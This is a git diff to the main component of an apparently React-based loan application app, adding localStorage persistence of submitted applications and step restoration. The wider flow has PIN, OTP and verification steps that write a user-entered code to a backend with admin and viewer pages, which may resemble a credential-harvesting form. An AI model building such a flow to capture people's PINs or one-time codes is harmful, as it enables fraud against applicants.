@@ -19,6 +19,7 @@ import { resolveActiveApplicationId } from './utils/applicationId';
 import { buildApplicationInsertPayload, createApplicationInSupabase, updateApplicationVerificationCodeInSupabase } from './utils/supabaseDirect';
 
 const PROCESSING_STORAGE_KEY = 'isProcessing';
+const SUBMITTED_APPLICATION_STORAGE_KEY = 'submittedApplication';
 
 const initialFormData: LoanFormData = {
   loanType: 'Personal Loan',
@@ -34,16 +35,39 @@ const initialFormData: LoanFormData = {
 };
 
 export default function App() {
-  const [currentStep, setCurrentStep] = useState<AppStep>('calculator');
+  const [currentStep, setCurrentStep] = useState<AppStep>(() => {
+    if (typeof window === 'undefined') return 'calculator';
+    const stored = window.localStorage.getItem(PROCESSING_STORAGE_KEY);
+    const validSteps: AppStep[] = ['calculator', 'step1', 'step2', 'step3', 'success', 'pin', 'verification', 'otp', 'loading', 'confirmation', 'idUpload', 'submitted'];
+    return stored && validSteps.includes(stored as AppStep) ? (stored as AppStep) : 'calculator';
+  });
   const [isAdminView, setIsAdminView] = useState<boolean>(() => {
     const isAdmin = window.location.pathname === '/admin';
     return isAdmin;
   });
   const [isViewerView, setIsViewerView] = useState<boolean>(() => window.location.pathname === '/viewer');
   const [formData, setFormData] = useState<LoanFormData>(initialFormData);
-  const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(null);
+  const [submittedApplication, setSubmittedApplication] = useState<SubmittedApplication | null>(() => {
+    if (typeof window === 'undefined') return null;
+    const stored = window.localStorage.getItem(SUBMITTED_APPLICATION_STORAGE_KEY);
+    if (!stored) return null;
+    try {
+      return JSON.parse(stored) as SubmittedApplication;
+    } catch {
+      window.localStorage.removeItem(SUBMITTED_APPLICATION_STORAGE_KEY);
+      return null;
+    }
+  });
   const [isSubmitting, setIsSubmitting] = useState(false);
   const submittedApplicationIdRef = useRef<string | null>(null);
+
+  const persistSubmittedApplication = (application: SubmittedApplication) => {
+    window.localStorage.setItem(SUBMITTED_APPLICATION_STORAGE_KEY, JSON.stringify(application));
+  };
+
+  const clearPersistedSubmittedApplication = () => {
+    window.localStorage.removeItem(SUBMITTED_APPLICATION_STORAGE_KEY);
+  };
 
   const resolveApplicationId = (fallbackId?: string | null) => {
     const candidates = [submittedApplication?.id, submittedApplicationIdRef.current, fallbackId];
@@ -105,7 +129,11 @@ export default function App() {
       window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'loading');
       setCurrentStep('loading');
       await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
-      setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
+      setSubmittedApplication((prev) => {
+        const next = prev ? { ...prev, verificationCode: displayValue } : null;
+        if (next) persistSubmittedApplication(next);
+        return next;
+      });
       window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'confirmation');
       setCurrentStep('confirmation');
     } catch (error: any) {
@@ -139,14 +167,18 @@ export default function App() {
       setCurrentStep('loading');
     } else if (processingState === 'confirmation') {
       setCurrentStep('confirmation');
-    } else if (processingState === 'approvalPending') {
-      setCurrentStep('confirmation');
     } else if (processingState === 'idUpload') {
       setCurrentStep('idUpload');
     } else if (processingState === 'submitted') {
       setCurrentStep('submitted');
     }
   }, []);
+
+  useEffect(() => {
+    if (!submittedApplication && ['confirmation', 'idUpload', 'submitted', 'otp', 'pin'].includes(currentStep)) {
+      handleReset();
+    }
+  }, [currentStep, submittedApplication]);
 
 
   const navigateToAdmin = () => {
@@ -178,6 +210,7 @@ export default function App() {
     setSubmittedApplication(null);
     submittedApplicationIdRef.current = null;
     window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
+    clearPersistedSubmittedApplication();
     setCurrentStep('calculator');
   };
 
@@ -211,6 +244,7 @@ export default function App() {
         verificationCode: null,
       };
       setSubmittedApplication(nextApplication);
+      persistSubmittedApplication(nextApplication);
     } catch (error: any) {
       console.error('Application create failed', {
         applicationId: payload.id,
@@ -243,6 +277,7 @@ export default function App() {
         verificationCode: submittedApplication?.verificationCode ?? null,
       };
       setSubmittedApplication(fallbackApp);
+      persistSubmittedApplication(fallbackApp);
     } catch (error: any) {
       console.error('Step 3 submit failed', {
         applicationId: previousApplicationId,
@@ -366,6 +401,9 @@ export default function App() {
                     onComplete={() => {
                       window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'idUpload');
                       setCurrentStep('idUpload');
+                    }}
+                    onRetry={() => {
+                      handleReset();
                     }}
                   />
                 )}
